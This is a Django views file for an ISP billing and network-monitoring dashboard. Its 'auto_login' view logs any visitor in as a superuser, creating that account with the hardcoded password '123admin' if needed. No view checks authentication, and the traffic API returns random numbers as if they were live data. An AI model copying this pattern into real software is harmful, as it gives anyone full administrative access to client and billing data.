'''
# Billing System - Africa Online Networks
# Copyright (c) 2025 Martin Mutinda. All Rights Reserved.
# 
# Proprietary Software - Unauthorized copying, modification, distribution,
# or use of this software via any medium is strictly prohibited.
# 
# This software is the confidential and proprietary information of
# Martin Mutinda ("Confidential Information"). You shall not disclose
# such Confidential Information and shall use it only in accordance
# with the terms of the license agreement.
# 
# For licensing inquiries:
# 📧 Email: martinmutinda@africaonlinenetworks.co.ke
# 📞 Phone: +254 706 315 742
# 
# Developed with ❤️ by Martin Mutinda
'''

from django.shortcuts import render, redirect, get_object_or_404
from django.http import JsonResponse, HttpResponse
from django.views.generic import TemplateView
from django.contrib.auth import login
from django.contrib.auth.models import User
import random
from .models import Client

# ===== MAIN DASHBOARD =====
def main_dashboard(request):
    """Main navigation dashboard"""
    return render(request, 'dashboard/main.html')

def network_main(request):
    """Network monitor main page"""
    return render(request, 'network/dashboard.html')

# ===== CLIENT MANAGEMENT =====
def client_list(request):
    """List all clients"""
    clients = Client.objects.all()
    return render(request, 'clients/client_list.html', {'clients': clients})

def client_create(request):
    """Create new client"""
    return render(request, 'clients/client_form.html')

def client_dashboard(request):
    """Client dashboard"""
    return render(request, 'clients/dashboard.html')

def client_location_pin(request, client_id):
    """Client location pin"""
    client = get_object_or_404(Client, id=client_id)
    return render(request, 'clients/location_pin.html', {'client': client})

def save_client_location(request, client_id):
    """Save client location"""
    client = get_object_or_404(Client, id=client_id)
    # Add location saving logic here
    return redirect('client_location_pin', client_id=client_id)

# ===== WHATSAPP MESSAGING =====
def whatsapp_compose(request):
    """WhatsApp compose message"""
    return render(request, 'whatsapp/compose.html')

def whatsapp_results(request):
    """WhatsApp results"""
    return render(request, 'whatsapp/results.html')

def whatsapp_reminders(request):
    """WhatsApp payment reminders"""
    return render(request, 'whatsapp/reminders.html')

# ===== NETWORK MONITORING =====
def network_dashboard(request):
    """Network dashboard"""
    return render(request, 'network/dashboard.html')

def network_live_dashboard(request):
    """Real-time network monitor"""
    return render(request, 'network/live_dashboard.html')

def network_traffic_api(request):
    """Network traffic API"""
    data = {
        'download': random.randint(10, 100),
        'upload': random.randint(5, 50),
        'sessions': random.randint(5, 50)
    }
    return JsonResponse(data)

def network_alerts_api(request):
    """Network alerts API"""
    return JsonResponse({'alerts': []})

def network_health_check(request):
    """Network health check API"""
    return JsonResponse({'status': 'healthy'})

def network_usage_breakdown(request):
    """Network usage breakdown API"""
    return JsonResponse({'usage': {}})

def network_peak_hours(request):
    """Network peak hours API"""
    return JsonResponse({'peak_hours': []})

# ===== COMBINED DASHBOARD =====
def combined_dashboard(request):
    """Combined dashboard"""
    return render(request, 'dashboard/combined.html')

# ===== AUTO LOGIN FUNCTION =====
def auto_login(request):
    """Auto login for clients"""
    try:
        user = User.objects.get(username='mutinda')
        login(request, user)
        return redirect('/clients/dashboard/')
    except User.DoesNotExist:
        user = User.objects.create_user('mutinda', 'eminentwriters8@gmail.com', '123admin')
        user.is_staff = True
        user.is_superuser = True
        user.save()
        login(request, user)
        return redirect('/clients/dashboard/')


def billing_dashboard(request):
    """Billing and payments dashboard focused on money management"""
    return render(request, 'billing/dashboard.html')

def financial_reports(request):
    """Comprehensive financial reports and analytics"""
    return render(request, 'reports/financial.html')

